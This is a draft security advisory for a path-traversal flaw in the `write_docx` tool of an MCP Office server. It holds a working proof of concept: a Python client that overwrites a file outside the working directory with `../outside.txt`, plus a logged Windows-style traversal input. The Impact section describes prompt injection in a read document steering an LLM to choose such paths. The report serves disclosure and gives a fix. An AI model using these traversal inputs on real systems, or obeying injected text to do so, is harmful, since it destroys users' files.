# Path traversal in `write_docx`: `path` can create or overwrite any file outside the working directory

**Repository:** `famano/mcp-server-office` · **Tool:** `write_docx` · **Tested commit:** `caa4ddd`
**Weakness:** CWE-22 Path Traversal

## Summary
`write_docx` creates a Word document at `path`. The tool description says the path "should be under your current working directory", but nothing enforces that. Unlike `read_docx` and the edit tools, `write_docx` does not even call `validate_path`, so relative paths, `..` segments, any file extension and existing files are all accepted. Any file the server's user can write can be replaced with a `.docx` archive.

## Details
`mcp_server_office/office.py:128-149` at `caa4ddd`:

```python
async def write_docx(path: str, content: str) -> None:
    document = Document()
    sections = content.split("\n\n")
    for section in sections:
        ...
            document.add_paragraph(section)
    document.save(path)
```

The handler at `mcp_server_office/office.py:370-372` passes `arguments["path"]` straight through. `validate_path` (`mcp_server_office/office.py:23-31`) only checks that a path is absolute, exists and ends in `.docx`, and it is used by the read and edit tools, not by `write_docx`. None of the tools resolve the path or compare it with the working directory that `mcp_server_office/tools.py:75` describes as the intended location.

## Steps to reproduce
1. Prerequisites: Python 3.12 or later. No accounts or keys. Create a working directory for the server and a marker file next to it:
   ```
   mkdir -p /tmp/tofu-poc/root && echo marker > /tmp/tofu-poc/outside.txt
   ```
2. Install the server from the tested commit:
   ```
   git clone https://github.com/famano/mcp-server-office.git
   cd mcp-server-office && git checkout caa4ddd6b5501d3abe1ce5ec2e62c098142c5f81
   python3 -m venv .venv && .venv/bin/pip install .
   ```
3. Start it with working directory `/tmp/tofu-poc/root` and call the tool with a relative path that leaves that directory:
   ```json
   {"path": "../outside.txt", "content": "tofu-poc"}
   ```

   ```python
   import asyncio, os
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   SERVER = os.path.abspath(".venv/bin/mcp-server-office")  # run from the mcp-server-office checkout

   async def main():
       server = StdioServerParameters(command=SERVER, args=[], cwd="/tmp/tofu-poc/root")
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("write_docx", {"path": "../outside.txt", "content": "tofu-poc"})
               print(result)

   asyncio.run(main())
   ```
4. What to observe: the result is `Document created successfully`. `/tmp/tofu-poc/outside.txt`, which is outside the working directory, no longer contains `marker`; `head -c 2 /tmp/tofu-poc/outside.txt` prints `PK`, the start of the `.docx` zip archive.

## Expected behavior
`write_docx` should resolve `path`, reject it unless it stays inside the working directory (or another configured root), require a `.docx` extension, and refuse to overwrite an existing file unless asked to.

## Actual behavior
Any path is written. From the fuzzing run:

```
input:  {'path': '..\\..\\..\\..\\windows\\win.ini', 'content': 'Windows path traversal attempt.'}
output: 'Document created successfully'
```

## Impact
In MCP the LLM chooses tool arguments, and prompt injection in content the model reads (for example a document it was asked to summarize) can steer them. An attacker can overwrite any file the user can write, outside the intended working directory, and destroy its contents. The written data is a `.docx` archive whose text the attacker chooses, so this is mainly an integrity and availability problem.

## Suggested fix
Add a containment check used by every tool, for example:

```python
root = os.path.realpath(os.getcwd())
target = os.path.realpath(path)
if os.path.commonpath([root, target]) != root:
    raise ValueError("path must be inside the working directory")
```

In `write_docx`, also require the `.docx` suffix and fail if the file exists, since the tool description says it is meant for new files.

## Status on the default branch
Still present at `caa4ddd` (2025-04-29). The tested commit is the head of the default branch.

## Prior reports
None found. Searched all 1 issue and 3 pull requests (fetched 2026-10-01) and the README / docs on the default branch. The only issue (#4) is a Smithery connection timeout.
- Documentation: README.md: `write_docx` takes "`path` (string) - Absolute path to target file" and is meant to "Create a new docx file"; no containment or overwrite rule is documented. The tool schema (`mcp_server_office/tools.py`) adds "It should be under your current working directory.", which the code does not enforce.

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal via `check_path_traversal`. Also fired for this tool: `check_introspection_incomplete_cleanup`, `check_introspection_temp_file_leak`, `check_introspection_type_confusion`.
- Campaigns and executions: recover-pc 1,536 exec / 1,051 ok (60 s); e2-0922 1 exec / 0 ok (60 s).
- Evidence (verbatim): input `{'path': '..\\..\\..\\..\\windows\\win.ini', 'content': 'Windows path traversal attempt.'}` -> `'Document created successfully'`. Only one logged sample.
- Hand-check hints: real. The path reaches `Document.save` with no check at all, and the tool's own description names the working directory as the intended location. The logged input itself is not a traversal on Linux: it created one file literally named `..\..\..\..\windows\win.ini` in the server's cwd. The `../outside.txt` overwrite is derived from the code, not from a logged run. The read and edit tools accept any absolute `.docx` path too (`validate_path` has no root check), which may be worth mentioning in the same issue. The e2-0922 entry ran once and failed, so only recover-pc produced evidence.
</details>
